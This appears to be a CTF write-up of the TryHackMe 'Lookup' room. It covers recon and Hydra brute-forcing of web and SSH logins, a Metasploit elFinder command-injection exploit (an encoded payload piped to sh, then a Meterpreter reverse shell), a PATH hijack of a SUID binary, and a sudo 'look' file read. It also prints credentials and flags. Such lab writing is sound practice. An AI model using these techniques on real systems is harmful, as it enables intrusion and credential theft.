@@ -1,0 +1,287 @@
+------ROOM Tryhackme Lookup---------
+Link: https://tryhackme.com/room/lookup
+Ip : 10.10.56.139
+Date: 09 April 2025
+
+
+-----------------Nmap enumeration----------------
+┌──(thierry㉿thierry)-[~/Desktop/Tools/burpsuite_pro_v2025.1.4]
+└─$ nmap -sC -sV -T4 -Pn 10.10.56.139
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-08 08:04 GMT
+Nmap scan report for 10.10.56.139
+Host is up (0.42s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
+|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
+|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://lookup.thm
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 54.78 seconds
+
+
+
+At this moment we have 2 ports the SSH port at 22 and the HTTP port 80. So we will start with the web server.
+
+gobuster dir -u http://lookup.thm/ -w=/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 100 --> nothing
+
+nikto -h http://lookup.thm   --> Nothing
+
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.222.214 -H "HOST: FUZZ.lookup.thm" -mc 200  --> nothing
+
+gobuster vhost -u "http://lookup.thm" --domain lookup.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain   --> nothnig
+ 
+
+I come back on the website page and decide to see how the website works
+
+REQUEST 1 
+	POST /login.php HTTP/1.1
+	Host: lookup.thm
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate, br
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 31
+	Origin: http://lookup.thm
+	Connection: keep-alive
+	Referer: http://lookup.thm/
+	Upgrade-Insecure-Requests: 1
+	Priority: u=0, i
+
+	username=toto&password=password
+
+
+ANSWER 1
+	HTTP/1.1 200 OK
+	Date: Wed, 09 Apr 2025 09:49:11 GMT
+	Server: Apache/2.4.41 (Ubuntu)
+	Refresh: 3; url=http://lookup.thm
+	Vary: Accept-Encoding
+	Content-Length: 74
+	Keep-Alive: timeout=5, max=100
+	Connection: Keep-Alive
+	Content-Type: text/html; charset=UTF-8
+
+	Wrong username or password. Please try again.<br>Redirecting in 3 seconds.
+
+
+REQUEST 2 --> i just change the username by admin
+
+ANSWER 2
+	HTTP/1.1 200 OK
+	Date: Wed, 09 Apr 2025 09:50:56 GMT
+	Server: Apache/2.4.41 (Ubuntu)
+	Refresh: 3; url=http://lookup.thm
+	Content-Length: 62
+	Keep-Alive: timeout=5, max=100
+	Connection: Keep-Alive
+	Content-Type: text/html; charset=UTF-8
+
+	Wrong password. Please try again.<br>Redirecting in 3 seconds.
+
+With this we will bruteforce usernames with burp or python script
+I finnaly decide to do it with burpsuite and after a long search in anwers i found 2usernames
+
+admin
+jose
+
+So i will try bruteforce with hydra and rockyou to try cracking the password
+
+hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-09 10:17:38
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong
+[STATUS] 945.00 tries/min, 945 tries in 00:01h, 14343454 to do in 252:59h, 16 active
+[80][http-post-form] host: lookup.thm   login: jose   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-09 10:19:09
+
+
+we foud the password now
+
+jose:password123
+
+When i loged in i was redirected to http://files.lookup.thm/ so let me add it in my host files
+
+when i finish and come back i was redirected here: http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw
+
+now we know that the website is running elfinder but which version. i search tab for it and i found that: 
+
+elFinder
+Web file manager
+Version: 2.1.47
+protocol version: 2.1047
+jQuery/jQuery UI: 3.3.1/1.12.1
+
+Now we will search for a vulnerability on this service
+
+searchsploit elfinder 2  
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+elFinder 2 - Remote Command Execution (via File Creation)                                                                                  | php/webapps/36925.py
+elFinder 2.1.47 - 'PHP connector' Command Injection                                                                                        | php/webapps/46481.py
+elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                | php/remote/46539.rb
+elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                | php/remote/46539.rb
+elFinder Web file manager Version - 2.1.53 Remote Command Execution                                                                        | php/webapps/51864.txt
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                                             
+
+So we will goto metasploit and test them
+
+msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set rhosts files.lookup.thm
+rhosts => files.lookup.thm
+msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set lhost tun0
+lhost => 10.11.127.125
+msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
+[*] Started reverse TCP handler on 10.11.127.125:4444 
+[*] Uploading payload 'slucuF.jpg;echo 6370202e2e2f66696c65732f736c756375462e6a70672a6563686f2a202e596f57594b372e706870 |xxd -r -p |sh& #.jpg' (1916 bytes)
+[*] Triggering vulnerability via image rotation ...
+[*] Executing payload (/elFinder/php/.YoWYK7.php) ...
+[*] Sending stage (40004 bytes) to 10.10.33.105
+[+] Deleted .YoWYK7.php
+[*] Meterpreter session 1 opened (10.11.127.125:4444 -> 10.10.33.105:41512) at 2025-04-09 10:56:08 +0000
+[*] No reply
+[*] Removing uploaded file ...
+[+] Deleted uploaded file
+
+meterpreter >
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ cd /home
+cd /home
+www-data@lookup:/home$ ls
+ls
+think
+www-data@lookup:/home$ cd think
+cd think
+www-data@lookup:/home/think$ ls -la
+ls -la
+total 40
+drwxr-xr-x 5 think think 4096 Jan 11  2024 .
+drwxr-xr-x 3 root  root  4096 Jun  2  2023 ..
+lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
+-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
+-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
+drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
+drwx------ 3 think think 4096 Aug  9  2023 .gnupg
+-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
+-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
+drw-r----- 2 think think 4096 Jun 21  2023 .ssh
+lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
+-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
+www-data@lookup:/home/think$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@lookup:/home/think$
+
+we do not hace permission also to read .password file
+
+After cating /etc/passwd file i noticed that it have only 2 users think and root
+
+After listing probably vul,erable binaries with the command: find / -perm -u=s -type f 2>/dev/null, i foud this:
+
+/usr/sbin/pwm
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount
+
+www-data@lookup:/home/think$ /usr/sbin/pwm
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+www-data@lookup:/home/think$ 
+
+when i run this it, it is like id command and try to read the .password file in the user directory we my hijack it to run this id command
+
+www-data@lookup:/home$ echo $PATH
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@lookup:/home$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+www-data@lookup:/home$ echo $PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@lookup:/home$ 
+
+
+now we will create a file named id in /tmp
+
+www-data@lookup:/tmp$ cat id
+cat id
+#!/bin/bash
+echo "uid=33(think) gid=33(think) groups=33(think)"
+www-data@lookup:/tmp$ chmod +x id
+chmod +x id
+www-data@lookup:/tmp$ /usr/sbin/pwm
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: think
+jose1006
+jose1004
+jose1002
+jose1001teles
+......
+
+we have a list of pawssword that we will use
+
+i put the list on the file passwords.txt and  launch brutforce with the username think using hydra tool
+
+hydra -l think -P passwords.txt ssh://lookup.thm 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-09 11:45:19
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
+[DATA] attacking ssh://lookup.thm:22/
+[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-09 11:45:29
+
+
+let us try ssh and get our user flag
+
+think@lookup:~$ cat user.txt
+38375fb4dd8baa2b2039ac03d92b820e
+
+
+
+----Privilege escalation
+
+
+think@lookup:~$ sudo -l
+[sudo] password for think: 
+Matching Defaults entries for think on lookup:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User think may run the following commands on lookup:
+    (ALL) /usr/bin/look
+think@lookup:~$ 
+
+think@lookup:~$ LFILE=/root/root.txt
+think@lookup:~$ sudo look '' "$LFILE"
+5a285a9f257e45c68bb6c9f9f57d18e8
+think@lookup:~$ 
